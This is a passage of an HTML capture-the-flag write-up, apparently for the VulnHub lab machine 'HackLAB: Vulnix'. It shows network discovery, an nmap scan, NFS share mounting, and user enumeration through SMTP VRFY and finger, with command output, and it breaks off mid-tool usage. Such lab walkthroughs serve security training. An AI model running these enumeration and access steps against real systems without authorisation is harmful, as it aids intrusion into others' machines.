@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+<section>
+
+    <writeup>
+        <h1><strong>#HackLAB: Vulnix</strong></h1>
+        <a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">https://www.vulnhub.com/entry/hacklab-vulnix,48/</a><br>
+        <br>
+        This box is similar to Kioptrix 1 except there's a few more steps along the way. Not big ones, though.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r &lt;internal network&gt;/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.189 is my Vulnix box.<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.189</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;192.168.1.189<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-12&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>12&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">vulnix</span>.lan&nbsp;(192.168.1.189)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.0016s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;988&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;5.9p1&nbsp;Debian&nbsp;5ubuntu1&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;1024&nbsp;10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf&nbsp;(DSA)<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a&nbsp;(RSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f&nbsp;(ECDSA)<br>
+                25/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;smtp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Postfix&nbsp;smtpd<br>
+                |_smtp-commands:&nbsp;vulnix,&nbsp;PIPELINING,&nbsp;SIZE&nbsp;10240000,&nbsp;VRFY,&nbsp;ETRN,&nbsp;STARTTLS,&nbsp;ENHANCEDSTATUSCODES,&nbsp;8BITMIME,&nbsp;DSN,&nbsp;<br>
+                |_ssl-date:&nbsp;2019-04-12T13:15:30+00:00;&nbsp;+2s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                79/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;finger&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Linux&nbsp;fingerd<br>
+                |_finger:&nbsp;No&nbsp;one&nbsp;logged&nbsp;on.\x0D<br>
+                110/tcp&nbsp;&nbsp;open&nbsp;&nbsp;pop3?<br>
+                111/tcp&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind&nbsp;&nbsp;&nbsp;&nbsp;2-4&nbsp;(RPC&nbsp;#100000)<br>
+                |&nbsp;rpcinfo:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;program&nbsp;version&nbsp;&nbsp;&nbsp;port/proto&nbsp;&nbsp;service<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/tcp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/udp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100003&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2049/tcp&nbsp;&nbsp;nfs<br>
+                |&nbsp;&nbsp;&nbsp;100003&nbsp;&nbsp;2,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2049/udp&nbsp;&nbsp;nfs<br>
+                |&nbsp;&nbsp;&nbsp;100005&nbsp;&nbsp;1,2,3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;46633/udp&nbsp;&nbsp;mountd<br>
+                |&nbsp;&nbsp;&nbsp;100005&nbsp;&nbsp;1,2,3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;47446/tcp&nbsp;&nbsp;mountd<br>
+                |&nbsp;&nbsp;&nbsp;100021&nbsp;&nbsp;1,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33696/tcp&nbsp;&nbsp;nlockmgr<br>
+                |&nbsp;&nbsp;&nbsp;100021&nbsp;&nbsp;1,3,4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;57502/udp&nbsp;&nbsp;nlockmgr<br>
+                |&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;44218/tcp&nbsp;&nbsp;status<br>
+                |&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;52215/udp&nbsp;&nbsp;status<br>
+                |&nbsp;&nbsp;&nbsp;100227&nbsp;&nbsp;2,3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2049/tcp&nbsp;&nbsp;nfs_acl<br>
+                |_&nbsp;&nbsp;100227&nbsp;&nbsp;2,3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2049/udp&nbsp;&nbsp;nfs_acl<br>
+                143/tcp&nbsp;&nbsp;open&nbsp;&nbsp;imap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dovecot&nbsp;imapd<br>
+                512/tcp&nbsp;&nbsp;open&nbsp;&nbsp;exec?<br>
+                513/tcp&nbsp;&nbsp;open&nbsp;&nbsp;login&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenBSD&nbsp;or&nbsp;Solaris&nbsp;rlogind<br>
+                514/tcp&nbsp;&nbsp;open&nbsp;&nbsp;tcpwrapped<br>
+                993/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssl/imaps?<br>
+                995/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssl/pop3s?<br>
+                2049/tcp&nbsp;open&nbsp;&nbsp;nfs_acl&nbsp;&nbsp;&nbsp;&nbsp;2-3&nbsp;(RPC&nbsp;#100227)<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:95:22:62&nbsp;(VMware)<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running:&nbsp;Linux&nbsp;2.6.X|3.X<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel:2.6&nbsp;cpe:/o:linux:linux_kernel:3<br>
+                OS&nbsp;details:&nbsp;Linux&nbsp;2.6.32&nbsp;-&nbsp;3.10<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                Service&nbsp;Info:&nbsp;Host:&nbsp;&nbsp;vulnix;&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_clock-skew:&nbsp;mean:&nbsp;1s,&nbsp;deviation:&nbsp;0s,&nbsp;median:&nbsp;1s<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;296.42&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        Lots of ports.<br>
+        A full port scan just reveals the rest of the rpc ports, which we don't need.<br>
+        <br>
+        • 22/ssh needs to be noted down for later.<br>
+        • 25/smtp can be used to enumerate users on the system.<br>
+        • 79/tcp can be used to distinguish system users from legitimate users.<br>
+        • 513/rsh and 514/rlogin can be used to bruteforce login credentials if you choose.<br>
+        • 2049/nfs is the last interesting port of the bunch.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 2049/nfs</strong></h2><br>
+        You might need to install <code>nfs-common</code> to access the file share first. I did.<br>
+        Check the network file share with <code>showmount -e 192.168.1.189</code> and mount it with <code>mount 192.168.1.189:/ nfs1</code><br>
+        Create a temp directory for it to be mounted to as well.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;apt&nbsp;<span style="color:#ff9d00;font-weight:700">install</span>&nbsp;nfs-common<br>
+                Reading&nbsp;package&nbsp;lists...&nbsp;Done<br>
+                Building&nbsp;dependency&nbsp;tree&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Reading&nbsp;state&nbsp;information...&nbsp;Done<br>
+                The&nbsp;following&nbsp;additional&nbsp;packages&nbsp;will&nbsp;be&nbsp;installed<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;&nbsp;keyutils&nbsp;libnfsidmap2&nbsp;rpcbind<br>
+                Suggested&nbsp;packages<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;&nbsp;open-iscsi&nbsp;watchdog<br>
+                The&nbsp;following&nbsp;NEW&nbsp;packages&nbsp;will&nbsp;be&nbsp;installed<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;&nbsp;keyutils&nbsp;libnfsidmap2&nbsp;nfs-common&nbsp;rpcbind<br>
+                0&nbsp;upgraded,&nbsp;4&nbsp;newly&nbsp;installed,&nbsp;0&nbsp;to&nbsp;remove&nbsp;and&nbsp;69&nbsp;not&nbsp;upgraded.<br>
+                Need&nbsp;to&nbsp;get&nbsp;375&nbsp;kB&nbsp;of&nbsp;archives.<br>
+                After&nbsp;this&nbsp;operation,&nbsp;1,167&nbsp;kB&nbsp;of&nbsp;additional&nbsp;disk&nbsp;space&nbsp;will&nbsp;be&nbsp;used.<br>
+                Do&nbsp;you&nbsp;want&nbsp;to&nbsp;continue?&nbsp;[Y<span style="color:#ff9d00;font-weight:700">/</span>n]&nbsp;y<br>
+                ...<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;showmount&nbsp;-e&nbsp;192.168.1.189<br>
+                Export&nbsp;list&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">192</span>.168.1.189:<br>
+                /home/vulnix&nbsp;*<br>
+                root@kali:~/ctf/vulnix#&nbsp;mkdir&nbsp;2049nfs<br>
+                root@kali:~/ctf/vulnix#&nbsp;cd&nbsp;2049nfs/<br>
+                root@kali:~/ctf/vulnix/2049nfs#&nbsp;mkdir&nbsp;nfs1<br>
+                root@kali:~/ctf/vulnix/2049nfs#&nbsp;mount&nbsp;192.168.1.189:/&nbsp;nfs1<br>
+                root@kali:~/ctf/vulnix/2049nfs#&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxr-xr-x&nbsp;&nbsp;3&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Apr&nbsp;12&nbsp;16:29&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;4&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Apr&nbsp;12&nbsp;16:29&nbsp;..<br>
+                drwxr-xr-x&nbsp;22&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;nfs1<br>
+                root@kali:~/ctf/vulnix/2049nfs#&nbsp;cd&nbsp;nfs1/<br>
+                root@kali:~/ctf/vulnix/2049nfs/nfs1#&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxr-xr-x&nbsp;22&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;3&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Apr&nbsp;12&nbsp;16:29&nbsp;..<br>
+                drwxr-xr-x&nbsp;&nbsp;4&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;home<br>
+                root@kali:~/ctf/vulnix/2049nfs/nfs1#&nbsp;cd&nbsp;home<br>
+                root@kali:~/ctf/vulnix/2049nfs/nfs1/home#&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxr-xr-x&nbsp;&nbsp;4&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;.<br>
+                drwxr-xr-x&nbsp;22&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;..<br>
+                drwxr-x---&nbsp;&nbsp;2&nbsp;nobody&nbsp;4294967294&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;vulnix<br>
+                root@kali:~/ctf/vulnix/2049nfs/nfs1/home#&nbsp;cd&nbsp;vulnix<br>
+                bash:&nbsp;cd:&nbsp;vulnix:&nbsp;Permission&nbsp;denied<br>
+                root@kali:~/ctf/vulnix/2049nfs/nfs1/home#&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Alas, we can't access anything. We would be able to if we knew vulnix's UID, but we don't.<br>
+        However, we did get a username out of this - <code>vulnix</code><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Moar users</strong></h2><br>
+        You can use 25/smtp to enumerate users on the system.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;25smtp<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;25smtp<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>25smtp#&nbsp;smtp-user-enum&nbsp;-M&nbsp;VRFY&nbsp;-U&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>metasploit<span style="color:#ff9d00;font-weight:700">/</span>unix_users.txt&nbsp;-t&nbsp;192.168.1.189<br>
+                Starting&nbsp;smtp-user-enum&nbsp;v1.2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>pentestmonkey.net<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>smtp-user-enum&nbsp;<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                &nbsp;----------------------------------------------------------<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Scan&nbsp;Information&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;----------------------------------------------------------<br>
+                <br>
+                Mode&nbsp;.....................&nbsp;VRFY<br>
+                Worker&nbsp;Processes&nbsp;.........&nbsp;5<br>
+                Usernames&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;...........&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>metasploit<span style="color:#ff9d00;font-weight:700">/</span>unix_users.txt<br>
+                Target&nbsp;count&nbsp;.............&nbsp;1<br>
+                Username&nbsp;count&nbsp;...........&nbsp;113<br>
+                Target&nbsp;TCP&nbsp;port&nbsp;..........&nbsp;25<br>
+                Query&nbsp;timeout&nbsp;............&nbsp;5&nbsp;secs<br>
+                Target&nbsp;domain&nbsp;............&nbsp;<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">########&nbsp;Scan&nbsp;started&nbsp;at&nbsp;Fri&nbsp;Apr&nbsp;12&nbsp;16:23:10&nbsp;2019&nbsp;#########</span><br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ROOT&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;backup&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;bin&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;daemon&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;games&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;gnats&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;irc&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;libuuid&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;list&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">lp</span>&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;mail&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">man</span>&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;messagebus&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;news&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;nobody&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;postmaster&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;proxy&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;root&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;sshd&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">sync</span>&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;sys&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;syslog&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;user&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;uucp&nbsp;exists<br>
+                192.168.1.189<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;www-data&nbsp;exists<br>
+                <span style="color:#0088ff;font-weight:400">########&nbsp;Scan&nbsp;completed&nbsp;at&nbsp;Fri&nbsp;Apr&nbsp;12&nbsp;16:26:18&nbsp;2019&nbsp;#########</span><br>
+                25&nbsp;results.<br>
+                <br>
+                113&nbsp;queries&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;3&nbsp;seconds&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>56.5&nbsp;queries&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;sec<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Most of the users here look like system users and not legitimate users on the machine.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>3a) 79/finger</strong></h3><br>
+        As a follow up, you can use 79/finger to find real users on the machine; those with a home directory.<br>
+        Kali doesn't have this script built-in so you'll have to download it from pentestmonkey's github.<br>
+        <a href="https://github.com/pentestmonkey/finger-user-enum">https://github.com/pentestmonkey/finger-user-enum</a><br>
+        <br>
+        I made of custom wordlist of the users enumerated from smtp-user-enum + vulnix attached onto the end.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;79finger<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;79finger<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>79finger#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>pentestmonkey<span style="color:#ff9d00;font-weight:700">/</span>finger-user-enum<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>finger-user-enum.pl<br>
+                --2019-04-12&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>49--&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>pentestmonkey<span style="color:#ff9d00;font-weight:700">/</span>finger-user-enum<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>finger-user-enum.pl<br>
+                Resolving&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)</span>...&nbsp;151.101.16.133<br>
+                Connecting&nbsp;to&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)|</span>151.101.16.133<span style="color:#ff9d00;font-weight:700">|:</span>443...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;12477&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>12K<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[text<span style="color:#ff9d00;font-weight:700">/</span>plain]<br>
+                Saving&nbsp;to<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;‘finger-user-enum.pl’<br>
+                <br>
+                finger-user-enum.pl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[===================================&gt;]&nbsp;&nbsp;12.18K&nbsp;&nbsp;--.-KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.003s&nbsp;&nbsp;<br>
+                <br>
+                2019-04-12&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>49&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>4.02&nbsp;MB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;‘finger-user-enum.pl’&nbsp;saved&nbsp;[12477<span style="color:#ff9d00;font-weight:700">/</span>12477]<br>
+                <br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>79finger#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                finger-user-enum.pl<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>79finger#&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;finger-user-enum.pl&nbsp;<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>79finger#&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>finger-user-enum.pl<br>
+                finger-user-enum&nbsp;v1.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>pentestmonkey.net<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>finger-user-enum&nbsp;<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                Usage<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;finger-user-enum.pl&nbsp;[options]&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;-u&nbsp;username&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;-U&nbsp;file-of-usernames&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;-t&nbsp;host&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;-T&nbsp;file-of-targets&nbsp;<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                options&nbsp;are<span style="color:#ff9d00;font-weight:700">:</span><br>
